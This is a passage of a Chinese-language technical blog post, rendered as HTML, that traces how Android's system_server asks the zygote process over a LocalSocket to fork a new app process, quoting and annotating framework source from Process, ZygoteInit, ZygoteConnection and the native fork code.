class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">String</span>[] extraArgs)</span></span><br><span class="hljs-function">                                 throws ZygoteStartFailedEx </span>&#123;<br>       <span class="hljs-built_in">synchronized</span>(<span class="hljs-built_in">Process</span>.class) &#123;   <br>        ......<br>           <span class="hljs-keyword">return</span> <span class="hljs-built_in">zygoteSendArgsAndGetResult</span>(<span class="hljs-built_in">openZygoteSocketIfNeeded</span>(abi), argsForZygote);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="3-3-6-Process-openZygoteSocketIfNeeded"><a href="#3-3-6-Process-openZygoteSocketIfNeeded" class="headerlink" title="3.3.6 Process.openZygoteSocketIfNeeded()"></a>3.3.6 Process.openZygoteSocketIfNeeded()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//如果zygote的socket没有打开，那就尝试打开，可能会阻塞或者重连</span><br><span class="hljs-keyword">private</span> static ZygoteState <span class="hljs-keyword">open</span><span class="hljs-constructor">ZygoteSocketIfNeeded(String <span class="hljs-params">abi</span>)</span> throws ZygoteStartFailedEx &#123;<br>        <span class="hljs-keyword">if</span> (primaryZygoteState<span class="hljs-operator"> == </span>null<span class="hljs-operator"> || </span>primaryZygoteState.is<span class="hljs-constructor">Closed()</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//向zygote进程发起连接</span><br>                primaryZygoteState = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ZygoteState</span>.</span></span>connect(ZYGOTE_SOCKET);<br>            &#125; catch (IOException ioe) &#123;<br>                throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">ZygoteStartFailedEx(<span class="hljs-string">&quot;Error connecting to primary zygote&quot;</span>, <span class="hljs-params">ioe</span>)</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (primaryZygoteState.matches(abi)) &#123;<br>            return primaryZygoteState;<br>        &#125;<br><br>        <span class="hljs-comment">//当主zygote没能匹配成功，则采用第二个zygote，发起connect()操作</span><br>        <span class="hljs-keyword">if</span> (secondaryZygoteState<span class="hljs-operator"> == </span>null<span class="hljs-operator"> || </span>secondaryZygoteState.is<span class="hljs-constructor">Closed()</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>            secondaryZygoteState = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ZygoteState</span>.</span></span>connect(SECONDARY_ZYGOTE_SOCKET);<br>            &#125; catch (IOException ioe) &#123;<br>                throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">ZygoteStartFailedEx(<span class="hljs-string">&quot;Error connecting to secondary zygote&quot;</span>, <span class="hljs-params">ioe</span>)</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (secondaryZygoteState.matches(abi)) &#123;<br>            return secondaryZygoteState;<br>        &#125;<br><br>        throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">ZygoteStartFailedEx(<span class="hljs-string">&quot;Unsupported zygote ABI: &quot;</span> + <span class="hljs-params">abi</span>)</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法会根据当前的abi来选择与zygote还是zygote64进行通信，在init进程解析rc文件的时候，会根据abi型号创建两个zygote；该方法最终会返回一个ZygoteState，它是Process的静态内部类，具体连接实现在ZygoteState.connect方法中</p><h4 id="3-3-7-Process-ZygoteState"><a href="#3-3-7-Process-ZygoteState" class="headerlink" title="3.3.7 Process.ZygoteState()"></a>3.3.7 Process.ZygoteState()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 与zygote进程通信的状态</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * @hide 仅限内部使用</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ZygoteState</span> &#123;</span><br>       <span class="hljs-keyword">final</span> LocalSocket socket;<br>       <span class="hljs-keyword">final</span> DataInputStream inputStream;<br>       <span class="hljs-keyword">final</span> BufferedWriter writer;<br>       <span class="hljs-keyword">final</span> List&lt;<span class="hljs-keyword">String</span>&gt; abiList;<br><br>       <span class="hljs-keyword">boolean</span> mClosed;<br><br>       <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">ZygoteState</span><span class="hljs-params">(LocalSocket socket, DataInputStream inputStream,</span></span><br><span class="hljs-params"><span class="hljs-function">               BufferedWriter writer, List&lt;<span class="hljs-keyword">String</span>&gt; abiList)</span> </span>&#123;<br>           <span class="hljs-keyword">this</span>.socket = socket;<br>           <span class="hljs-keyword">this</span>.inputStream = inputStream;<br>           <span class="hljs-keyword">this</span>.writer = writer;<br>           <span class="hljs-keyword">this</span>.abiList = abiList;<br>       &#125;<br><br>       <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ZygoteState <span class="hljs-title">connect</span><span class="hljs-params">(<span class="hljs-keyword">String</span> socketAddress)</span> throws IOException </span>&#123;<br>           DataInputStream zygoteInputStream = null;<br>           BufferedWriter zygoteWriter = null;<br>           <span class="hljs-keyword">final</span> LocalSocket zygoteSocket = <span class="hljs-keyword">new</span> <span class="hljs-built_in">LocalSocket</span>();<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               zygoteSocket.<span class="hljs-built_in">connect</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">LocalSocketAddress</span>(socketAddress,<br>                       LocalSocketAddress.Namespace.RESERVED));<br><br>               zygoteInputStream = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataInputStream</span>(zygoteSocket.<span class="hljs-built_in">getInputStream</span>());<br><br>               zygoteWriter = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">OutputStreamWriter</span>(<br>                       zygoteSocket.<span class="hljs-built_in">getOutputStream</span>()), <span class="hljs-number">256</span>);<br>           &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (IOException ex) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   zygoteSocket.<span class="hljs-built_in">close</span>();<br>               &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (IOException ignore) &#123;<br>               &#125;<br><br>               <span class="hljs-keyword">throw</span> ex;<br>           &#125;<br><br>           <span class="hljs-keyword">String</span> abiListString = <span class="hljs-built_in">getAbiList</span>(zygoteWriter, zygoteInputStream);<br>           Log.<span class="hljs-built_in">i</span>(<span class="hljs-string">&quot;Zygote&quot;</span>, <span class="hljs-string">&quot;Process: zygote socket opened, supported ABIS: &quot;</span> + abiListString);<br><br>           <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">ZygoteState</span>(zygoteSocket, zygoteInputStream, zygoteWriter,<br>                   Arrays.<span class="hljs-built_in">asList</span>(abiListString.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;,&quot;</span>)));<br>       &#125;<br><br>       <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">matches</span><span class="hljs-params">(<span class="hljs-keyword">String</span> abi)</span> </span>&#123;<br>           <span class="hljs-keyword">return</span> abiList.<span class="hljs-built_in">contains</span>(abi);<br>       &#125;<br><br>       <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> </span>&#123;<br>           <span class="hljs-keyword">try</span> &#123;<br>               socket.<span class="hljs-built_in">close</span>();<br>           &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (IOException ex) &#123;<br>               Log.<span class="hljs-built_in">e</span>(LOG_TAG,<span class="hljs-string">&quot;I/O exception on routine close&quot;</span>, ex);<br>           &#125;<br><br>           mClosed = <span class="hljs-literal">true</span>;<br>       &#125;<br><br>       <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isClosed</span><span class="hljs-params">()</span> </span>&#123;<br>           <span class="hljs-keyword">return</span> mClosed;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>可以看到这里是通过LocalSocket进行进程间通信；这种通信的双方一般是Native层的server端，Framework层的Client端，中间涉及到jni调用。</p><p>而Android中的LocalSocket是基于UNIX-domain Socket的，UNIX-domain Socket是在Socket的基础上衍生出来的一种IPC通信机制，因此LocalSocket解决的是同一台主机上不同进程间互相通信的问题。其相对于网络通信使用的socket不需要经过网络协议栈，不需要打包拆包、计算校验，自然的执行效率也高。与大名鼎鼎的binder机制作用一样，都在Android系统中作为IPC通信手段被广泛使用；一般由LocalSocket（Client）和LocalServerSocket（Server）组成通信双方。</p><p>那么在本文中AMS所在的system-server进程就充当了Client，zygote进程充当Server，因为zygote进程在创建的时候会在ZygoteInit.main方法中调用ZygoteInit.registerZygoteSocket方法，会实例化一个LocalServerSocket，并且在ZygoteInit.runSelectLoop方法中不停的获取客户端的请求</p><h3 id="3-4-Zygote接收到请求"><a href="#3-4-Zygote接收到请求" class="headerlink" title="3.4 Zygote接收到请求"></a>3.4 Zygote接收到请求</h3><h4 id="3-4-1-ZygoteInit-main"><a href="#3-4-1-ZygoteInit-main" class="headerlink" title="3.4.1 ZygoteInit.main()"></a>3.4.1 ZygoteInit.main()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span> argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-built_in">registerZygoteSocket</span>(socketName); <span class="hljs-comment">//为Zygote注册socket</span><br>        <span class="hljs-built_in">runSelectLoop</span>(abiList); <span class="hljs-comment">//进入循环模式，获取客户端连接并处理</span><br>        ....<br>    &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (MethodAndArgsCaller caller) &#123;<br>        caller.<span class="hljs-built_in">run</span>();<br>    &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (RuntimeException ex) &#123;<br>        <span class="hljs-built_in">closeServerSocket</span>();<br>        <span class="hljs-keyword">throw</span> ex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-2-ZygoteInit-runSelectLoop"><a href="#3-4-2-ZygoteInit-runSelectLoop" class="headerlink" title="3.4.2 ZygoteInit.runSelectLoop()"></a>3.4.2 ZygoteInit.runSelectLoop()</h4><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> runSelectLoop(<span class="hljs-keyword">String</span> abiList) <span class="hljs-keyword">throws</span> MethodAndArgsCaller &#123;<br>    ArrayList&lt;FileDescriptor&gt; fds = <span class="hljs-keyword">new</span> ArrayList&lt;FileDescriptor&gt;();<br>    ArrayList&lt;ZygoteConnection&gt; peers = <span class="hljs-keyword">new</span> ArrayList&lt;ZygoteConnection&gt;();<br>    <span class="hljs-comment">//sServerSocket是socket通信中的服务端，即zygote进程。保存到fds[0]</span><br>    fds.<span class="hljs-built_in">add</span>(sServerSocket.getFileDescriptor());<br>    peers.<span class="hljs-built_in">add</span>(<span class="hljs-keyword">null</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>        StructPollfd[] pollFds = <span class="hljs-keyword">new</span> StructPollfd[fds.<span class="hljs-built_in">size</span>()];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; pollFds.length; ++i) &#123;<br>            pollFds[i] = <span class="hljs-keyword">new</span> StructPollfd();<br>            pollFds[i].fd = fds.<span class="hljs-built_in">get</span>(i);<br>            pollFds[i].events = (<span class="hljs-keyword">short</span>) POLLIN;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>             <span class="hljs-comment">//处理轮询状态，当pollFds有事件到来则往下执行，否则阻塞在这里</span><br>            Os.poll(pollFds, <span class="hljs-number">-1</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ErrnoException ex) &#123;<br>            ...<br>        &#125;<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = pollFds.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>            <span class="hljs-comment">//采用I/O多路复用机制，当接收到客户端发出连接请求 或者数据处理请求到来，则往下执行；</span><br>            <span class="hljs-comment">// 否则进入continue，跳出本次循环。</span><br>            <span class="hljs-keyword">if</span> ((pollFds[i].revents &amp; POLLIN) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">//即fds[0]，代表的是sServerSocket，则意味着有客户端连接请求；</span><br>                <span class="hljs-comment">// 则创建ZygoteConnection对象,并添加到fds。</span><br>                ZygoteConnection newPeer = acceptCommandPeer(abiList);<br>                peers.<span class="hljs-built_in">add</span>(newPeer);<br>                fds.<span class="hljs-built_in">add</span>(newPeer.getFileDesciptor()); <span class="hljs-comment">//添加到fds.</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//i&gt;0，则代表通过socket接收来自对端的数据，并执行相应操作</span><br>                <span class="hljs-built_in">boolean</span> done = peers.<span class="hljs-built_in">get</span>(i).runOnce();<br>                <span class="hljs-keyword">if</span> (done) &#123;<br>                    peers.remove(i);<br>                    fds.remove(i); <span class="hljs-comment">//处理完则从fds中移除该文件描述符</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里通过acceptCommandPeer方法获取连接过来的客户端，然后执行ZygoteConnection.runOnce方法处理请求</p><h4 id="3-4-3-ZygoteConnection-runOnce"><a href="#3-4-3-ZygoteConnection-runOnce" class="headerlink" title="3.4.3 ZygoteConnection.runOnce()"></a>3.4.3 ZygoteConnection.runOnce()</h4><p>源码位于 frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 从socket读取一个启动命令；如果有就fork一个子进程</span><br><span class="hljs-comment">     * 如果fork成功，就会抛出 ZygoteInit.MethodAndArgsCaller异常</span><br><span class="hljs-comment">     */</span><br>boolean runOnce() throws ZygoteInit.MethodAndArgsCaller &#123;<br><br>    <span class="hljs-keyword">String</span> args[];<br>    Arguments parsedArgs = <span class="hljs-literal">null</span>;<br>    FileDescriptor[] descriptors;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//读取socket客户端发送过来的参数列表</span><br>        args = readArgumentList();<br>        descriptors = mSocket.getAncillaryFileDescriptors();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>        ...<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    ...<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//将binder客户端传递过来的参数，解析成Arguments对象格式</span><br>        parsedArgs = <span class="hljs-keyword">new</span> <span class="hljs-type">Arguments</span>(args);<br>        ...<br>        pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids,<br>                parsedArgs.debugFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo,<br>                parsedArgs.niceName, fdsToClose, parsedArgs.instructionSet,<br>                parsedArgs.appDataDir);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">//子进程执行</span><br>            IoUtils.closeQuietly(serverPipeFd);<br>            serverPipeFd = <span class="hljs-literal">null</span>;<br>            <span class="hljs-comment">//进入子进程流程</span><br>            handleChildProc(parsedArgs, descriptors, childPipeFd, <span class="hljs-keyword">new</span><span class="hljs-type">Stderr</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//父进程执行</span><br>            IoUtils.closeQuietly(childPipeFd);<br>            childPipeFd = <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">return</span> handleParentProc(pid, descriptors, serverPipeFd, parsedArgs);<br>        &#125;<br>    &#125; finally &#123;<br>        IoUtils.closeQuietly(childPipeFd);<br>        IoUtils.closeQuietly(serverPipeFd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里先解析客户端发送过来的参数列表，然后调用Zygote.forkAndSpecialize方法</p><h4 id="3-4-4-Zygote-forkAndSpecialize"><a href="#3-4-4-Zygote-forkAndSpecialize" class="headerlink" title="3.4.4 Zygote.forkAndSpecialize()"></a>3.4.4 Zygote.forkAndSpecialize()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ZygoteHooks VM_HOOKS = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ZygoteHooks</span>();<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * fork一个新的vm实例， 必须使用-Xzygote标志启动当前VM</span><br><span class="hljs-comment">    * 新实例保留所有root功能</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">forkAndSpecialize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> uid, <span class="hljs-keyword">int</span> gid, <span class="hljs-keyword">int</span>[] gids, <span class="hljs-keyword">int</span> debugFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">         <span class="hljs-keyword">int</span>[][] rlimits, <span class="hljs-keyword">int</span> mountExternal, <span class="hljs-keyword">String</span> seInfo, <span class="hljs-keyword">String</span> niceName, <span class="hljs-keyword">int</span>[] fdsToClose,</span></span><br><span class="hljs-params"><span class="hljs-function">         <span class="hljs-keyword">String</span> instructionSet, <span class="hljs-keyword">String</span> appDataDir)</span> </span>&#123;<br>       VM_HOOKS.<span class="hljs-built_in">preFork</span>();<br>       <span class="hljs-keyword">int</span> pid = <span class="hljs-built_in">nativeForkAndSpecialize</span>(<br>                 uid, gid, gids, debugFlags, rlimits, mountExternal, seInfo, niceName, fdsToClose,<br>                 instructionSet, appDataDir);<br><br>       VM_HOOKS.<span class="hljs-built_in">postForkCommon</span>();<br>       <span class="hljs-keyword">return</span> pid;<br>   &#125;<br></code></pre></td></tr></table></figure><p>这里在fork新进程的时候会先调用 VM_HOOKS.preFork()</p><h4 id="3-4-5-ZygoteHooks-preFork"><a href="#3-4-5-ZygoteHooks-preFork" class="headerlink" title="3.4.5 ZygoteHooks.preFork()"></a>3.4.5 ZygoteHooks.preFork()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void pre<span class="hljs-constructor">Fork()</span> &#123;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Daemons</span>.</span></span>stop<span class="hljs-literal">()</span>; <span class="hljs-comment">//停止4个Daemon子线程</span><br>    wait<span class="hljs-constructor">UntilAllThreadsStopped()</span>; <span class="hljs-comment">//等待所有子线程结束</span><br>    token = native<span class="hljs-constructor">PreFork()</span>; <span class="hljs-comment">//完成gc堆的初始化工作</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法的主要目的是停止zygote进程的四个daemon子线程，分别是ReferenceQueueDaemon，FinalizerDaemon，FinalizerWatchdogDaemon，HeapTaskDaemon；直到zygote是是单线程，以便于提高fork效率；</p><p>fork新进程是调用native方法，经过jni调用</p><h4 id="3-4-6-com-android-internal-os-Zygote-nativeForkAndSpecialize"><a href="#3-4-6-com-android-internal-os-Zygote-nativeForkAndSpecialize" class="headerlink" title="3.4.6 com_android_internal_os_Zygote.nativeForkAndSpecialize()"></a>3.4.6 com_android_internal_os_Zygote.nativeForkAndSpecialize()</h4><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">static</span> <span class="hljs-function">jint <span class="hljs-title">com_android_internal_os_Zygote_nativeForkAndSpecialize</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    JNIEnv* env, jclass, jint uid, jint gid, jintArray gids,</span></span><br><span class="hljs-params"><span class="hljs-function">    jint debug_flags, jobjectArray rlimits,</span></span><br><span class="hljs-params"><span class="hljs-function">    jint mount_external, jstring se_info, jstring se_name,</span></span><br><span class="hljs-params"><span class="hljs-function">    jintArray fdsToClose, jstring instructionSet, jstring appDataDir)</span> </span>&#123;<br>    <span class="hljs-comment">// 将CAP_WAKE_ALARM赋予蓝牙进程</span><br>    jlong capabilities = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (uid == AID_BLUETOOTH) &#123;<br>        capabilities |= (<span class="hljs-number">1</span>LL &lt;&lt; CAP_WAKE_ALARM);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">ForkAndSpecializeCommon</span><span class="hljs-params">(env, uid, gid, gids, debug_flags,</span></span><br><span class="hljs-params"><span class="hljs-function">            rlimits, capabilities, capabilities, mount_external, se_info,</span></span><br><span class="hljs-params"><span class="hljs-function">            se_name, <span class="hljs-keyword">false</span>, fdsToClose, instructionSet, appDataDir)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-7-com-android-internal-os-Zygote-ForkAndSpecializeCommone"><a href="#3-4-7-com-android-internal-os-Zygote-ForkAndSpecializeCommone" class="headerlink" title="3.4.7 com_android_internal_os_Zygote.ForkAndSpecializeCommone()"></a>3.4.7 com_android_internal_os_Zygote.ForkAndSpecializeCommone()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">pid_t</span> <span class="hljs-title">ForkAndSpecializeCommon</span><span class="hljs-params">(JNIEnv* env, <span class="hljs-keyword">uid_t</span> uid, <span class="hljs-keyword">gid_t</span> gid, jintArray javaGids,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     jint debug_flags, jobjectArray javaRlimits,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     jlong permittedCapabilities, jlong effectiveCapabilities,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     jint mount_external,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     jstring java_se_info, jstring java_se_name,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     <span class="hljs-keyword">bool</span> is_system_server, jintArray fdsToClose,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     jstring instructionSet, jstring dataDir)</span> </span>&#123;<br>  